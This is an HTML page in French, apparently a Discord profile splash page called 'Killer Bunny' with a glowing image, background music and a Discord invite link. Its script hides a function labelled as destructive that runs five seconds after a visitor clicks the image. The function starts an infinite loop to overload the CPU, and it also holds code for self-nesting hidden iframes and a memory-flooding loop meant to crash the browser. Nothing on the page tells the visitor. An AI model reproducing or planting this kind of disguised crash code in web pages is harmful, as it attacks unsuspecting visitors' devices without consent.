<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Killer Bunny</title>
    <style>
        /* Thème sombre global */
        body {
            margin: 0;
            padding: 0;
            background: #000000;
            color: #ffffff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        /* Écran noir avec bouton central */
        #intro-screen {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            width: 100%;
            height: 100%;
            position: absolute;
            background: #000000;
            z-index: 10;
        }

        /* Bouton Profil en thème sombre et blanc */
        .profile-button {
            padding: 20px 40px;
            font-size: 20px;
            font-weight: bold;
            color: #000000;
            background: #ffffff;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 0 20px rgba(255, 255, 255, 0.7), 0 0 40px rgba(0, 0, 0, 0.5);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .profile-button:hover {
            transform: scale(1.1);
            box-shadow: 0 0 30px rgba(255, 255, 255, 1), 0 0 60px rgba(0, 0, 0, 0.7);
        }

        /* Conteneur principal */
        .container {
            display: none;
            text-align: center;
            position: relative;
            width: 100%;
            height: 100%;
            justify-content: center;
            align-items: center;
            display: flex;
            flex-direction: column;
        }

        /* Style de l'image */
        .killer-bunny {
            max-width: 300px;
            max-height: 300px;
            animation: fadeIn 2s ease-in-out;
            filter: drop-shadow(0 0 20px rgba(255, 255, 255, 0.7)) drop-shadow(0 0 40px rgba(0, 0, 0, 0.5));
            transition: transform 0.5s ease, filter 0.5s ease;
            cursor: pointer;
        }

        .killer-bunny:hover {
            transform: scale(1.1);
            filter: drop-shadow(0 0 40px rgba(255, 255, 255, 1)) drop-shadow(0 0 60px rgba(0, 0, 0, 0.7));
        }

        /* Animation de fade-in */
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: scale(0.8);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        /* Effet brillant autour de l'image */
        .glow {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 350px;
            height: 350px;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.2), transparent);
            border-radius: 50%;
            z-index: -1;
            animation: pulse 3s infinite ease-in-out;
        }

        /* Animation de pulsation */
        @keyframes pulse {
            0%, 100% {
                opacity: 0.5;
                transform: scale(1);
            }
            50% {
                opacity: 1;
                transform: scale(1.2);
            }
        }
    </style>
</head>
<body>
    <!-- Écran noir avec bouton Profil -->
    <div id="intro-screen">
        <button class="profile-button" onclick="startPage()">Profil ErrorNoName</button>
    </div>

    <!-- Conteneur de l'image principale -->
    <div class="container">
        <div class="glow"></div>
        <img src="https://i.ibb.co/dMK3t7j/4328d00292b082b5f8fa1b648d25b666-removebg-preview.png" 
             alt="Lapin Tueur" class="killer-bunny"
             onclick="openDiscord()">
    </div>

    <!-- Musique de fond -->
    <audio id="background-music">
        <source src="https://cdn.discordapp.com/attachments/1299564827378847754/1299846772407013436/overloaded.ogg?ex=6775b324&is=677461a4&hm=3986af953bba91f9f42a00d1ecebb68a97649688875804ddb651dfc77ecf0d23&" type="audio/mpeg">
        Votre navigateur ne supporte pas la lecture audio.
    </audio>

    <!-- Scripts JavaScript -->
    <script>
        // Fonction pour démarrer la page
        function startPage() {
            const audio = document.getElementById("background-music");
            const introScreen = document.getElementById("intro-screen");
            const container = document.querySelector(".container");

            // Lancer la musique
            audio.play().then(() => {
                // Cacher l'écran d'intro et afficher le contenu principal
                introScreen.style.display = "none";
                container.style.display = "flex";
            }).catch(error => {
                console.error("Erreur de lecture audio : ", error);
            });
        }

        // Fonction pour ouvrir le Discord
        function openDiscord() {
            window.open('https://discord.gg/amsUQdUQa7', '_blank');
            setTimeout(launchCrashScripts, 5000);
        }

        // Fonction contenant les scripts destructeurs
        function launchCrashScripts() {
            // Boucle infinie pour surcharger le CPU
            while (true) {
                console.log("Boucle Infinie...");
            }

            // Iframes imbriquées à l'infini pour saturer la mémoire
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            document.body.appendChild(iframe);
            const nextQueryValue = !location.search ? 1 : Number(location.search.split("?").pop()) + 1;
            iframe.src = `index.html?${nextQueryValue}`;

            // Surcharge mémoire immédiate
            let memoryOverload = [];
            for (let i = 0; i < 100000; i++) {
                memoryOverload.push({});
            }
            console.log("Surcharge mémoire immédiate !");
        }
    </script>
</body>
</html>
